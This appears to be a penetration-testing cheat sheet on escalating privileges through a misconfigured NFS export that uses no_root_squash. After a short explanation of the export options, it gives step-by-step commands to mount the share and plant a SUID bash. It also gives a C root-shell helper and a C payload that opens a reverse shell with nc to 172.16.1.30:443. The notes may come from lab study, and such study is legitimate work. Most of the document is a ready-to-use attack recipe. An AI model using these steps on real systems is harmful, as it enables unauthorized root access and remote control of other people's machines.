## What is NFS?
- Network File System runs on port 2049 and allows clients to access shared directories from a server over the network.  
- By default, the root_squash option maps root actions on the client to nobody:nogroup for security. 
>If misconfigured with no_root_squash, clients can mount shares with root privileges, enabling privilege escalation.


## How to ?
Read `/etc/exports`
```
cat /etc/exports

# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
```
- `rw`: Grants read/write access  
- `sync`: Writes changes to disk before replying (safer but slower) resulting in a more stable and consistent environment but reduces the speed of file operations  
- `insecure`: Allows access from any client port  
- `no_subtree_check`: This option prevents subtree checking, which is a process where the host must check whether the file is actually still available in the exported tree for every request.  
- `no_root_squash`: This option allows privileged file writes inside the share. By default, NFS translates requests from a root user remotely into a non-privileged user on the server. This was intended as security feature to prevent a root account on the client from using the file system of the host as root â€“ no_root_squash disables this behavior.  

List all nfs shares
```
showmount -e <TARGET_IP>
```
Mount vulnerable share
```
mkdir nfsdir
mount -t nfs 10.10.10.10:/mnt/share /tmp/nfsdir    
cd /tmp/nfsdir
```
### SUID
```
cp /bin/bash .  
chmod +s bash  
```
### Craft exploit
```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash -p"); return 0; }' > /tmp/nfsdir/root_shell.c
gcc ./root_shell.c -o ./root_shell
cp root_shell /mnt/share/
chmod +s /mnt/share/root_shell
```
### Reverse shell
```
echo 'int main() { setgid(0); setuid(0); system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 172.16.1.30 443 >/tmp/f"); return 0; }' > /mnt/share/root_reverse_shell.c
```
